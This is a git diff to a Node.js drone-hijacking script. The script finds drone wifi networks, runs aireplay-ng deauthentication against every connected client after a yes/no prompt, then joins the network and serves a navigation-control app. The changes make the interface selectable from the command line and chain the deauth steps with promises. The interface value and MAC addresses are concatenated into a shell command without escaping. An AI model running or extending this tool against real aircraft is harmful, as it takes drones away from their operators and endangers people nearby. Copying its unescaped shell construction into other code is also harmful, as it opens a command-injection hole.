@@ -19,12 +19,12 @@ if (!commandExistsSync('arp-scan')) { console.log("Error : missing command 'arp-
 if (!commandExistsSync('aireplay-ng')) { console.log("Error : missing command 'aireplay-ng' please install 'aircrack-ng' and retry"); process.exit(); }
 
 // Init values, wifi, launch deauth attack, then init navigation app (step by step using promise)
-var iface = 'wlan0';
+var iface = process.argv[2] ? process.argv[2] : 'wlan0';
 var target = null;
 var attackMAC = null;
 var scan_wifi = scanWifi();
-var deauth = scan_wifi.then(launchDeauth, console.error);
-var connect_wifi = deauth.then(connectWifi, console.error);
+var deauth = scan_wifi.then(launchDeauth);
+var connect_wifi = deauth.then(connectWifi);
 
 Promise.all([scan_wifi, deauth, connect_wifi]).then(values => {
   http.listen(3000, function() {
@@ -32,7 +32,7 @@ Promise.all([scan_wifi, deauth, connect_wifi]).then(values => {
   });
 
   initNavControl();
-});
+}, console.error);
 
 /**
 * Scan for drone wifi networks using MAC address prefixes and
@@ -123,6 +123,7 @@ function launchDeauth() {
         console.log("No Clients to deauth");
         resolve();
       } else{
+
         //Confirm prompt before deauth
         var schema = {
           properties: {
@@ -138,14 +139,28 @@ function launchDeauth() {
         prompt.start();
         prompt.get(schema, function(err, result) {
           if (result.choice === true) {
+            var deauthPromises = [];
+            //For all targets create a deauth promise
             deauthTargets.forEach((client, i) => {
-              console.log('Disconnecting : ' + client.mac);
-              var exec = cp.exec;
-              exec('aireplay-ng -0 3 -a ' + target.mac + ' -c ' + client.mac + ' ' + iface, function callback(err, stdout, stderr) {
-                if (err) return reject(stderr);
-                resolve(stdout);
+              var deauthPromise = new Promise((resolve, reject) => {
+                console.log('Disconnecting : ' + client.mac);
+                var exec = cp.exec;
+                exec('aireplay-ng -0 3 -a ' + target.mac + ' -c ' + client.mac + ' ' + iface, function callback(err, stdout, stderr) {
+                  if (err) return reject(err);
+                  resolve();
+                });
               });
+              deauthPromises.push(deauthPromise);
             });
+
+            //When all targets are deauth proceed
+            Promise.all(deauthPromises).then(values => {
+              resolve();
+            }, reason => {
+              console.error(reason);
+            });
+          }else{
+            return reject("Deauth attack was cancel");
           }
         });
       }
@@ -158,7 +173,6 @@ function launchDeauth() {
 */
 function connectWifi() {
   return new Promise(function(resolve, reject) {
-
     console.log('Connection to ' + target.mac + ' ...');
     wifi.connect({
       ssid: target.ssid
